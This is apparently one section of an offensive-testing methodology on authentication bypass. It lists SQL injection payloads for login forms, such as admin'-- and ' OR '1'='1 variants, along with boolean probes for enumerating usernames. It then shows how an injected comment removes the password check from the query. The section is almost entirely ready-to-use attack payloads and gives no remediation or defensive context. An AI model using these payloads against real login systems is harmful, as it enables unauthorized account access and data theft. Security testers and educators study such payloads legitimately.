# Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```